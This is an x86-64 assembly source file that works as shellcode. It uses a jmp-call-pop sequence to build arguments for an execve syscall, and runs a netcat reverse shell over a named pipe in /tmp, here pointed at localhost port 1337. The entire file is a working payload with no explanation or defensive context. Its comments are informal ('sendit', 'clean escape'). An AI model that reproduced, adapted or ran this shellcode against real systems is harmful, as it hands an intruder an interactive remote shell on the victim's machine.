#include <sys/syscall.h>

#define STRING	"/bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc localhost 1337 >/tmp/f"
#define STRLEN1	7
#define STRLEN2	10
#define STRLEN3	82
#define ARGV	(STRLEN3+1)
#define ENVP	(ARGV+24)

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp   silly

ballin:
  endbr64
  pop   rbx			
 
  /* arg pointer? ;) */ 
  mov   [ARGV + rbx],rbx	

  mov   rcx,rbx
  add   rcx,STRLEN1+1
  mov   [ARGV + rbx + 8],rcx	

  mov   rcx,rbx
  add   rcx,STRLEN2+1
  mov   [ARGV + rbx + 16],rcx	

  /* null terminator? ;) */
  xor   rax,rax
  mov   [STRLEN1 + rbx],al
  mov   [STRLEN2 + rbx],al
  mov   [STRLEN3 + rbx],al
  mov   [ENVP + rbx],rax

  /* sendit */
  mov   al,SYS_execve
  mov   rdi,rbx
  lea   rsi,[ARGV + rbx]
  lea   rdx,[ENVP + rbx]
  syscall

  /* clean escape */
  xor   rdi,rdi
  xor   rax,rax
  mov   al,SYS_exit
  syscall

silly:
  endbr64
  call    ballin
  .string STRING
